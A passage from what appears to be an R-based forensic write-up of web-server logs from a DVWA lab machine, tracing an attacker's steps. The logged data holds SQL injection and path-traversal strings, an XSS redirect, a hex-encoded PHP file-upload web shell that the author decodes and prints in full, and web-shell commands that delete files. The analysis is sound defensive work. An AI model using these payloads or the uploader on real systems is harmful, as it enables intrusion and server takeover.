images/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/addons/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/addons/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/addons/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/addons/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/blog/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/blog/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/blog/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/blog/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/flags/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/flags/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/flags/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/flags/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/screenshots/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/screenshots/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/screenshots/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/screenshots/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/stamps/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/stamps/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/stamps/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/stamps/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/team/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/team/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/images/team/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/images/team/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/javascripts/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/javascripts/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/javascripts/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/javascripts/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/stylesheets/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/stylesheets/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/stylesheets/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/stylesheets/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/about.php","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/css/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/css/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/css/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/css/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/images/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/images/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/images/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/images/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/DBMS/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/js/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/js/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/js/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/dvwa/js/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/hackable/","2":"1"},{"1":"http://192.168.56.101/dvwa/ids_log.php","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/brute/","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/brute/.?username=admin&Login=Login&password=password","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/brute/?username=admin&Login=Login&password=password","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/captcha/","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/captcha/.","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/csrf/","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/csrf/.","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/csrf/.?password_conf=password&password_new=password&Change=Change&password_current=password","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/csrf/?password_conf=password&password_new=password&Change=Change&password_current=password","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../../../../../abc.txt","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../../../../../xampp/phpMyAdmin/config.inc","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../../../windows/system32/drivers/etc/hosts","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=4&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=5&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=6&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+and+0%3D0+union+select+column_name%2C+null+from+information_schema.columns+where+table_name+%3D+%27users%27+--+&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+1%3D1+--+&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+--+&Submit=Submit","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/.","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/.?name=Peter%2bWinter","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Ch1%3EXSS%3C%2Fh1%3E","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindows.location%3D%22http%3A%2F%2F192.168.56.102%22%3C%2Fscript%3E","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=ali","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=Ali","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=XSS","2":"1"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_s/.","2":"1"},{"1":"http://192.168.56.101/icons/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/icons/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/icons/small/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/icons/small/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/icons/small/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/icons/small/?C=S;O=A","2":"1"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

And now let’s hone in on anything with “vulnerabilities”, “security”, or
“exec” in the URL.

    suspicious_activity |>
        filter(str_detect(referer, "vulnerabilities|security|exec")) |>
        count(referer, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["referer"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"http://192.168.56.101/dvwa/vulnerabilities/exec/","2":"32"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/","2":"17"},{"1":"http://192.168.56.101/dvwa/security.php","2":"16"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_s/","2":"10"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit","2":"5"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/","2":"5"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+union+select+user%28%29%2C+database%28%29+--+&Submit=Submit","2":"4"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+%271%27+%3D+%271&Submit=Submit","2":"3"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/brute/.","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/","2":"2"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

This is pretty enlightening as we get quite a few leads. There are calls
to `sqli`, `xss_s`, `xss_r`, and `brute`, which all seem interesting.
I’m going to start with `sqli` and get a sense of the commands being
run.

    suspicious_activity |>
        filter(str_detect(referer, "sqli/\\?")) |>
        mutate(cmd = str_replace(
            referer,
            "http://192.168.56.101/dvwa/vulnerabilities/sqli/\\?",
            "")
        ) |>
        count(cmd, sort=TRUE)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["cmd"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"id=1&Submit=Submit","2":"5"},{"1":"id=a%27+union+select+user%28%29%2C+database%28%29+--+&Submit=Submit","2":"4"},{"1":"id=a%27+or+%271%27+%3D+%271&Submit=Submit","2":"3"},{"1":"id=2&Submit=Submit","2":"2"},{"1":"id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+where+table_name+like+%22user%25%22--+&Submit=Submit","2":"2"},{"1":"id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"id=1&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit&id=555-555-0199@example.com&Submit=Submit","2":"1"},{"1":"id=3&Submit=Submit","2":"1"},{"1":"id=4&Submit=Submit","2":"1"},{"1":"id=5&Submit=Submit","2":"1"},{"1":"id=6&Submit=Submit","2":"1"},{"1":"id=a%27+and+0%3D0+union+select+column_name%2C+null+from+information_schema.columns+where+table_name+%3D+%27users%27+--+&Submit=Submit","2":"1"},{"1":"id=a%27+or+1%3D1+--+&Submit=Submit","2":"1"},{"1":"id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+--+&Submit=Submit","2":"1"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

And what happens if we run the same request on the `resource` field?
There are 1,270 unique combinations of queries (I cheated and ran a
query not included here), so focusing on the top 10 to see if there are
any commands that are repeated frequently will be more valuable to look
at.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        mutate(cmd = str_replace(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?",
            ""
        )) |>
        count(cmd, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["cmd"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"id=2&Submit=Submit","2":"44"},{"1":"id=2%20ORDER%20BY%201--%20&Submit=Submit","2":"8"},{"1":"id=2%20ORDER%20BY%201%23&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL--%20&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&Submit=Submit","2":"8"},{"1":"id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20&Submit=Submit","2":"8"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

A lot of these commands all include the word “Submit”. I wonder if there
are commands that don’t include that.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        filter(!str_detect(resource, "Submit")) |>
        mutate(cmd = str_replace(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?",
            ""
        )) |>
        count(cmd, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["cmd"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

No, so all of them include “Submit”. Let’s try looking for some that
aren’t `SELECT` or `UNION` calls? I’m effectively trying to find unique
commands that aren’t what appear to be the attackers attempt to find SQL
commands that work. And since we know that every command will have
`&Submit=Submit`, let’s chop that off, just to clean it up a bit. Also,
let’s decode the commands to try to get a better sense of what they’re
doing. I’m also going to cheat once again and only show the results that
I felt were interesting from this query, which I found by running the
query and reading through the results.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        filter(!str_detect(resource, "SELECT|UNION")) |>
        mutate(cmd = str_replace_all(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?|&Submit=Submit",
            ""
        )) |>
        mutate(cmd = urltools::url_decode(cmd)) |>
        filter(str_detect(cmd, 'php')) |>
        select(ip, date, time, method, cmd)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["date"],"name":[2],"type":["date"],"align":["right"]},{"label":["time"],"name":[3],"type":["chr"],"align":["left"]},{"label":["method"],"name":[4],"type":["chr"],"align":["left"]},{"label":["cmd"],"name":[5],"type":["chr"],"align":["left"]}],"data":[{"1":"192.168.56.102","2":"2015-09-02","3":"04:25:52 -0700","4":"GET","5":"id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpukudk.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- --"},{"1":"192.168.56.102","2":"2015-09-02","3":"23:52:24 -0700","4":"GET","5":"id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpudvfh.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- --"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

These two records stuck out to me as they seem to be creating two unique
PHP files, and I’m curious what those hex values (ostensibly) are. But
first, I want to see if these files are mentioned in other places in the
logs. Let’s look at one specific file.

    suspicious_activity |>
        filter(str_detect(resource, "tmpudvfh.php")) |>
        mutate(resource=urltools::url_decode(resource)) |>
        select(time, resource)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["time"],"name":[1],"type":["chr"],"align":["left"]},{"label":["resource"],"name":[2],"type":["chr"],"align":["left"]}],"data":[{"1":"23:52:24 -0700","2":"/dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpudvfh.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- &Submit=Submit"},{"1":"23:52:24 -0700","2":"/xampp/htdocs/tmpudvfh.php"},{"1":"23:52:24 -0700","2":"/htdocs/tmpudvfh.php"},{"1":"23:52:24 -0700","2":"/tmpudvfh.php"},{"1":"23:52:24 -0700","2":"/tmpudvfh.php"},{"1":"23:59:38 -0700","2":"/tmpbrjvl.php?cmd=del /F /Q C:\\\\xampp\\\\htdocs\\\\tmpudvfh.php"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Oh, interesting. There are a few entries in the log here. Look at that
last entry; it looks like it’s deleting itself. Sneaky. Are there other
`tmp.*.php` files?

    suspicious_activity |>
        mutate(file=str_extract(resource, "tmp.+?\\.php")) |>
        filter(!is.na(file)) |>
        count(file, sort=TRUE)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["file"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"tmpudvfh.php","2":"5"},{"1":"tmpukudk.php","2":"5"},{"1":"tmpbiwuc.php","2":"4"},{"1":"tmpbrjvl.php","2":"3"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

I see 4 unique PHP files being utilized in the logs. We’re definitely
going to want to dig into this more. Let’s start by digging into those
hex values and convert them to text. The following code does this by
extracting those hex values out of the logs, removes the “0x” prefix,
and then deduplicates the values. Once the values have been extracted, a
function to convert the hex to string is implemented, and then the hex
values are looped over and run through the function. The results are
then printed to the screen.

    hex_values <- suspicious_activity |>
        filter(str_detect(resource, "tmp.+\\.php")) |>
        mutate(hex = str_extract(resource, "0x[a-f0-9]+")) |>
        mutate(hex = str_replace(hex, "0x", "")) |>
        filter(!is.na(hex)) |>
        pull(hex) |>
        unique()

    convert_hex_to_string <- function(hex) {
        hex <- sapply(
            seq(1, nchar(hex), by=2),
            function(x) substr(hex, x, x + 1)
        )
        
        result <- gsub(
            '[^[:print:]]+', 
            '', 
            rawToChar(as.raw(strtoi(hex, 16L)))
        )
        return(result)
    }

    results <- unname(sapply(hex_values, convert_hex_to_string))
    cat(results)

    ## <?phpif (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}?>

Let’s clean that up a bit to make it easier to read.

    <?php
    if (isset($_REQUEST["upload"])) {
        $dir = $_REQUEST["uploadDir"];
        
        if (phpversion()<'4.1.0') { 
            $file = $HTTP_POST_FILES["file"]["name"];
            @move_uploaded_file(
                $HTTP_POST_FILES["file"]["tmp_name"], 
                $dir."/".$file
            ) or die();
        }
        else {
            $file=$_FILES["file"]["name"];
            @move_uploaded_file(
                $_FILES["file"]["tmp_name"], 
                $dir."/".$file
            ) or die();
        }
        
        @chmod($dir."/".$file, 0755);
        echo "File uploaded";
    }
    else {
        echo "
        <form 
            action=".$_SERVER["PHP_SELF"]."
            method=POST
            enctype=multipart/form-data
        >
            <input type=hidden name=MAX_FILE_SIZE value=1000000000>
                <b>sqlmap file uploader</b>
                <br>
                <input name=file type=file>
                <br>
                to directory: 
                <input type=text name=uploadDir value=\\xampp\\htdocs\\>
                <input type=submit name=upload value=upload>
        </form>
        ";
    }
    ?>

Clearly the attacker is uploading PHP files to create web shells, right?
Doesn’t this mean we should be able to see calls to those files getting
made in the logs?

    processed |>
        filter(str_detect(resource, "\\.php\\?")) |>
        mutate(resource = urltools::url_decode(resource)) |>
        select(resource)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["resource"],"name":[1],"type":["chr"],"align":["left"]}],"data":[{"1":"/dvwa/security.php?phpids=on"},{"1":"/dvwa/security.php?test=\"><script>eval(window.name)<\/script>"},{"1":"/dvwa/security.php?phpids=off"},{"1":"/dvwa/instructions.php?doc=PHPIDS-license"},{"1":"/dvwa/ids_log.php?clear_log=Clear+Log"},{"1":"/tmpbiwuc.php?cmd=echo command execution test"},{"1":"/tmpbiwuc.php?cmd=dir"},{"1":"/tmpbiwuc.php?cmd=del /F /Q C:\\\\xampp\\\\htdocs\\\\tmpukudk.php"},{"1":"/tmpbiwuc.php?cmd=del /F /Q \\\\xampp\\\\htdocs\\\\tmpbiwuc.php"},{"1":"/tmpbrjvl.php?cmd=echo command execution test"},{"1":"/tmpbrjvl.php?cmd=del /F /Q C:\\\\xampp\\\\htdocs\\\\tmpudvfh.php"},{"1":"/tmpbrjvl.php?cmd=del /F /Q \\\\xampp\\\\htdocs\\\\tmpbrjvl.php"},{"1":"/dvwa/hackable/uploads/phpshell.php?dir"},{"1":"/dvwa/hackable/uploads/phpshell.php?cmd=dir"},{"1":"/dvwa/hackable/uploads/phpshell.php?cmd=dir C:\\\\\\\\"},{"1":"/dvwa/hackable/uploads/phpshell.php?cmd=mkdir abc"},{"1":"/dvwa/hackable/uploads/phpshell.php?cmd=dir"},{"1":"/dvwa/c99.php?act=img&img=home"},{"1":"/dvwa/c99.php?act=img&img=search"},{"1":"/dvwa/c99.php?act=img&img=buffer"},{"1":"/dvwa/c99.php?act=img&img=sort_asc"},{"1":"/dvwa/c99.php?act=img&img=small_dir"},{"1":"/dvwa/c99.php?act=img&img=ext_diz"},{"1":"/dvwa/c99.php?act=img&img=ext_lnk"},{"1":"/dvwa/c99.php?act=img&img=ext_htaccess"},{"1":"/dvwa/c99.php?act=img&img=change"},{"1":"/dvwa/c99.php?act=img&img=download"},{"1":"/dvwa/c99.php?act=img&img=ext_md"},{"1":"/dvwa/c99.php?act=img&img=ext_txt"},{"1":"/dvwa/c99.php?act=img&img=ext_php"},{"1":"/dvwa/c99.php?act=img&img=forward"},{"1":"/dvwa/c99.php?act=img&img=up"},{"1":"/dvwa/c99.php?act=img&img=ext_ico"},{"1":"/dvwa/c99.php?act=img&img=arrow_ltr"},{"1":"/dvwa/c99.php?act=img&img=refresh"},{"1":"/dvwa/c99.php?act=img&img=ext_ini"},{"1":"/dvwa/c99.php?act=img&img=ext_zip"},{"1":"/dvwa/c99.php?act=img&img=back"},{"1":"/dvwa/c99.php?act=cmd"},{"1":"/dvwa/c99.php?act=cmd"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>
